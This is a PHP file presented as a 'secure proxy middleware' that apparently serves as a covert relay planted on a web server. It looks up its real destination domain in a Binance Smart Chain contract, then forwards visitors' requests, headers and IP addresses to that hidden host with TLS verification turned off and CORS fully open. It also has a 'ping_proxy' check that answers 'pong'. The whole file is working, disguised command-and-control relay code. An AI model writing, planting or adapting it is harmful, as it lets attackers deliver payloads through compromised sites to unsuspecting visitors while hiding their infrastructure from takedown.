<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: *');
header('Access-Control-Allow-Headers: *');
header('Access-Control-Max-Age: 3600');

function getClientIP() {
    // Check for Cloudflare IP
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        return $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    
    // Check X-Forwarded-For
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Get first IP in chain
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    
    // Fallback to direct IP
    return $_SERVER['REMOTE_ADDR'];
}


class SecureProxyMiddleware {
    private $updateInterval = 60;
    private $rpcUrls;
    private $contractAddress;
    private $cacheFile;
    
    public function __construct($options = []) {
        $this->rpcUrls = $options['rpcUrls'] ?? [
            "https://rpc.ankr.com/bsc",
            "https://bsc-dataseed2.bnbchain.org"
        ];
        $this->contractAddress = $options['contractAddress'] ?? "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0";
        
        $serverIdentifier = md5(
            $_SERVER['SERVER_NAME'] . ':' . 
            $_SERVER['SERVER_ADDR'] . ':' . 
            $_SERVER['SERVER_SOFTWARE']
        );
        $this->cacheFile = sys_get_temp_dir() . '/proxy_cache_' . $serverIdentifier . '.json';
    }

    private function loadCache() {
        if (!file_exists($this->cacheFile)) return null;
        $cache = json_decode(file_get_contents($this->cacheFile), true);
        if (!$cache || (time() - $cache['timestamp']) > $this->updateInterval) {
            return null;
        }
        return $cache['domain'];
    }

    private function filterHeaders($headers) {
        $blacklist = ['host'];
        $formatted = [];
        
        foreach ($headers as $key => $value) {
            $key = strtolower($key);
            if (!in_array($key, $blacklist)) {
                $formatted[] = "$key: $value";
            }
        }
        
        return $formatted;
    }

    private function saveCache($domain) {
        $cache = ['domain' => $domain, 'timestamp' => time()];
        file_put_contents($this->cacheFile, json_encode($cache));
    }

    private function hexToString($hex) {
        $hex = preg_replace('/^0x/', '', $hex);
        $hex = substr($hex, 64);
        $lengthHex = substr($hex, 0, 64);
        $length = hexdec($lengthHex);
        $dataHex = substr($hex, 64, $length * 2);
        $result = '';
        for ($i = 0; $i < strlen($dataHex); $i += 2) {
            $charCode = hexdec(substr($dataHex, $i, 2));
            if ($charCode === 0) break;
            $result .= chr($charCode);
        }
        return $result;
    }

    private function fetchTargetDomain() {
        $data = '20965255';
        
        foreach ($this->rpcUrls as $rpcUrl) {
            try {
                $ch = curl_init($rpcUrl);
                curl_setopt_array($ch, [
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => json_encode([
                        'jsonrpc' => '2.0',
                        'id' => 1,
                        'method' => 'eth_call',
                        'params' => [[
                            'to' => $this->contractAddress,
                            'data' => '0x' . $data
                        ], 'latest']
                    ]),
                    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
                    CURLOPT_TIMEOUT => 120,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false
                ]);

                $response = curl_exec($ch);
                if (curl_errno($ch)) {
                    curl_close($ch);
                    continue;
                }
                
                curl_close($ch);
                $responseData = json_decode($response, true);
                if (isset($responseData['error'])) continue;

                $domain = $this->hexToString($responseData['result']);
                if ($domain) return $domain;
            } catch (Exception $e) {
                continue;
            }
        }
        throw new Exception('Could not fetch target domain');
    }

    private function getTargetDomain() {
        $cachedDomain = $this->loadCache();
        if ($cachedDomain) return $cachedDomain;

        $domain = $this->fetchTargetDomain();
        $this->saveCache($domain);
        return $domain;
    }

    private function formatHeaders($headers) {
        $formatted = [];
        foreach ($headers as $name => $value) {
            if (is_array($value)) $value = implode(', ', $value);
            $formatted[] = "$name: $value";
        }
        return $formatted;
    }

    public function handle($endpoint) {
        try {
            $targetDomain = rtrim($this->getTargetDomain(), '/');
            $endpoint = '/' . ltrim($endpoint, '/');
            $url = $targetDomain . $endpoint;
            
            $clientIP = getClientIP();

            $headers = getallheaders();
            // $headers = $this->filterHeaders($headers);
            unset($headers['Host'], $headers['host']);
            unset($headers['origin'], $headers['Origin']);
            unset($headers['Accept-Encoding'], $headers['Content-Encoding']);
            unset($headers['Content-Encoding'], $headers['content-encoding']);
        
            $headers['x-dfkjldifjlifjd'] = $clientIP;
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_CUSTOMREQUEST => $_SERVER['REQUEST_METHOD'],
                CURLOPT_POSTFIELDS => file_get_contents('php://input'),
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HTTPHEADER => $this->formatHeaders($headers),
                CURLOPT_TIMEOUT => 120,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => false,
                CURLOPT_ENCODING => ''
            ]);

            $response = curl_exec($ch);
            if (curl_errno($ch)) {
                throw new Exception(curl_error($ch));
            }
            
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $contentType = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
            curl_close($ch);

            header('Access-Control-Allow-Origin: *');
            header('Access-Control-Allow-Methods: GET, HEAD, POST, OPTIONS');
            header('Access-Control-Allow-Headers: *');
            if ($contentType) header('Content-Type: ' . $contentType);
            
            http_response_code($httpCode);
            echo $response;

        } catch (Exception $e) {
            http_response_code(500);
            echo 'error' . $e;
        }
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: GET, HEAD, POST, OPTIONS');
    header('Access-Control-Allow-Headers: *');
    header('Access-Control-Max-Age: 86400');
    http_response_code(204);
    exit;
}

if ($_GET['e'] === 'ping_proxy') {
    header('Content-Type: text/plain');
    echo 'pong';
    exit;
} else if (isset($_GET['e'])) {
    $proxy = new SecureProxyMiddleware([
        'rpcUrls' => [
            "https://rpc.ankr.com/bsc",
            "https://bsc-dataseed2.bnbchain.org"
        ],
        'contractAddress' => "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0"
    ]);
    $endpoint = urldecode($_GET['e']);
    $endpoint = ltrim($endpoint, '/');
    $proxy->handle($endpoint);
} else {
    http_response_code(400);
    echo 'Missing endpoint';
}